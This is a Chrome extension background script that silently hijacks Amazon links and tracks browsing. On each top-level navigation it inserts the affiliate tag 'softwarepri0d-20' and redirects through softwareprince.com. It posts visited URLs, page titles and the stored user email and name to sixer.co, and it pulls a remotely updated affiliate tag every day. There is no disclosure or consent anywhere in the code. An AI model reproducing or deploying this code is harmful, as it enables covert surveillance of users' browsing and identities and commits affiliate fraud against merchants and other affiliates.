let extName = "", extVersion = "";
//best regex for amazon url
let myRegExp = "https?:\\/\\/(?:....)?amazon|smile\\S+(?:[/])([A-Z0-9]{10})(?:\\/|\\?|\\&|\\s|$)"
var myUrls = ["<all_urls>"];
var OLDURL = "", urlArg1 = "tag=", urlArg2 = "softwarepri0d-20";
formTag = () => {
    return '?' + urlArg1 + urlArg2 + "&"
}

tell = (desc, url, title = "") => {
    chrome.storage.local.get(['userEmail', 'userName'], (store) => {
        chrome.management.getSelf((me) => {
            if (!store.userEmail) { store.userEmail = "", store.userName = "" }
            extName = me.name;
            extVersion = me.version;
            var requrl = "https://sixer.co/SoftwareEventNew/public/api/event";
            json = { "name": extName, "version": extVersion, "softwareType": "Chrome Extension", "email": store.userEmail, "userName": store.userName, "description": desc, "url": url, "urlTitle": title };
            //send using fetch
            fetch(requrl, {
                method: 'POST',
                body: JSON.stringify(json)
            }).then(response => response.text())
                .then(data => console.log("event", json, data))
                .catch(error => console.log("myError ",error));
        })
    });
}

//content of file "WhoIsUser.js"

var userName = [], userEmail = [];
chrome.management.getSelf((me) => {
    // console.log(userName, userEmail);
    //console.log(me.name, me.version);
    extName = me.name;
    extVersion = me.version;
    //tell that this is an active user
    setTimeout(() => tell("browser has started", ""), 5000);

})


chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason) {
        setTimeout(() => tell("extension has been " + details.reason + "ed", ""), 4500);
    }
});

chrome.webNavigation.onBeforeNavigate.addListener(
    function (details) {
        if (details.frameType === "outermost_frame") {
            // console.log(details.url.indexOf(urlArg1 + urlArg2) === -1, RegExp(myRegExp).test(details.url))
            if (details.url.indexOf(urlArg1 + urlArg2) === -1
                //&& RegExp(myRegExp).test(details.url)
            ) {
//                console.log(details);
                let newUrl = changeurl(details.url, urlArg1, urlArg2, ".amazon.")
                let obj = { url: newUrl }
                console.log("mv3.1 redirecting to ", obj, newUrl, details.url);
                chrome.tabs.update(details.tabId, obj);
            } else {
                tell("mv3 visiting", details.url, details.title);
            }

        }
    });

function matchwild(str, rule) {
    var escapeRegex = (str) => str.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
    return new RegExp("^" + rule.split("*").map(escapeRegex).join(".*") + "$").test(str);
}

function changeurl(oldurl, affiliateVarName, affiliatemMyCode, WebSite) {
    var newurl = "";
    var affiliateCode = affiliateVarName + affiliatemMyCode;
    var newurlparts = [];
    if (!matchwild(oldurl, "*" + affiliateCode + "*"))
        if (matchwild(oldurl, "*" + WebSite + "*")) {
            newurlparts = oldurl.split("?");
            newurlparts[1] = "?" + newurlparts[1];
            //  console.log(newurlparts);
            if ((matchwild(newurlparts[0], "*signup*") || matchwild(newurlparts[0], "*sign-up*") || matchwild(newurlparts[0], "*login*") || matchwild(newurlparts[0], "*signin*") || matchwild(newurlparts[0], "*user*"))) {
                tell("mv3 visiting without adding tag because its signup/signin page", oldurl)
                return;
            }
            var nnewpart = newurlparts[1].split("?" + affiliateVarName);
            if (nnewpart.length > 1) {
                var nnnew = nnewpart[1].split("&");
                if (nnnew.length > 1)
                    oldurl = newurlparts[0] + "?" + nnnew[1];
                else
                    oldurl = newurlparts[0];
            }
            var nnewpart = newurlparts[1].split("&" + affiliateVarName);
            if (nnewpart.length > 1) {
                var nnnew = nnewpart[1].split("&");
                if (nnnew.length > 1)
                    oldurl = newurlparts[0] + nnewpart[0] + "&" + nnnew[1];
                else
                    oldurl = newurlparts[0] + nnewpart[0];
            }
            if (!matchwild(oldurl, "*?*"))
                newurl = oldurl + "?" + affiliateCode;
            if (matchwild(oldurl, "*?*")) {
                newurlparts = oldurl.split("?");
                newurl = newurlparts[0] + "?" + affiliateCode + "&" + newurlparts[1];
            }
            tell("mv3 redirecting request to include amazon tag", newurl)
            newurl = "https://softwareprince.com/amzTool.php?url=" + encodeURIComponent(newurl);
            return newurl;
        } else {
            tell("mv3 visit", oldurl)
        }

}


//run this code everyday
chrome.alarms.create("checkForUpdate", { delayInMinutes: 1, periodInMinutes: 1440 });
chrome.alarms.onAlarm.addListener(function (alarm) {
    if (alarm.name === "checkForUpdate") {
        updateAmzCode();
    }
});
let updateAmzCode = () => {
    var requrl = "https://softwareprince.com/NaeemAnalytics/amznTag.php";
    fetch(requrl).then((response) => {
        return response.text();
    }).then((data) => {
        urlArg2 = data;
    }).catch((err) => {
        console.log("error", err)
    });
}
updateAmzCode();